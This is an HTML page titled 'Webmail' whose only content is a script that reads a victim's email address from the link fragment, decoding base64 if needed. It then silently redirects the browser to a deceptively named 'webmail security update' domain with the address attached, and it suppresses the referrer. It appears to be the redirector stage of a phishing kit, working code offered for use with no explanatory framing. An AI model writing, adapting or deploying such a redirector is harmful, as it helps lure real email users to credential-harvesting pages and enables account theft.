<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta name="referrer" content="no-referrer">
  <title>Webmail</title>
</head>

<body>
<script>
"use strict";

(() => {
  const MAX_INPUT = 4096;
  const MAX_EMAIL = 254;

  // Keep this on a destination you control.
  const DESTINATION = "https://publicionoswebmailsecurtyupdatepzxc.vercel.app#";

  const fragment = location.hash.slice(1);

  if (!fragment || fragment.length > MAX_INPUT) return;

  let input;

  try {
    input = decodeURIComponent(fragment);
  } catch {
    return;
  }

  input = input
    .replace(/[\u0000-\u001F\u007F]/g, "")
    .trim();

  let raw = "";

  // Query-string extraction.
  try {
    const query = input.includes("?")
      ? input.slice(input.indexOf("?") + 1)
      : input;

    const params = new URLSearchParams(query);

    for (const value of params.values()) {
      if (
        value &&
        (value.includes("@") || isBase64(value))
      ) {
        raw = value;
        break;
      }
    }
  } catch {}

  // Direct-value fallback.
  if (!raw) {
    const candidate = input.split("?")[0];

    if (
      candidate.includes("@") ||
      isBase64(candidate)
    ) {
      raw = candidate;
    }
  }

  if (!raw || raw.length > MAX_INPUT) return;

  let email = raw;

  // Base64.
  if (isBase64(email)) {
    const decoded = decodeBase64(email);

    if (decoded !== null) {
      email = decoded;
    }
  }

  // Encoded @.
  email = email
    .replace(/%40/gi, "@")
    .trim();

  if (!isEmail(email)) return;

  /*
   * Preserve the #email behavior.
   * Using href also keeps the previous page
   * in browser history.
   */
  const destination =
    new URL(DESTINATION, location.href);

  destination.hash = email;

  location.href = destination.href;


  function isBase64(value) {
    return (
      typeof value === "string" &&
      value.length > 0 &&
      value.length <= MAX_INPUT &&
      value.length % 4 === 0 &&
      /^[A-Za-z0-9+/]*={0,2}$/.test(value)
    );
  }


  function decodeBase64(value) {
    try {
      const binary = atob(value);

      const bytes =
        Uint8Array.from(
          binary,
          c => c.charCodeAt(0)
        );

      return new TextDecoder(
        "utf-8",
        { fatal: true }
      ).decode(bytes);

    } catch {
      return null;
    }
  }


  function isEmail(value) {
    if (
      typeof value !== "string" ||
      value.length > MAX_EMAIL ||
      /[\s\r\n]/.test(value)
    ) {
      return false;
    }

    const parts = value.split("@");

    if (parts.length !== 2) return false;

    const [local, domain] = parts;

    if (
      !local ||
      !domain ||
      local.length > 64 ||
      domain.length > 253
    ) {
      return false;
    }

    if (
      !/^[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+$/.test(local)
    ) {
      return false;
    }

    return /^(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z]{2,63}$/
      .test(domain);
  }

})();
</script>
</body>
</html>
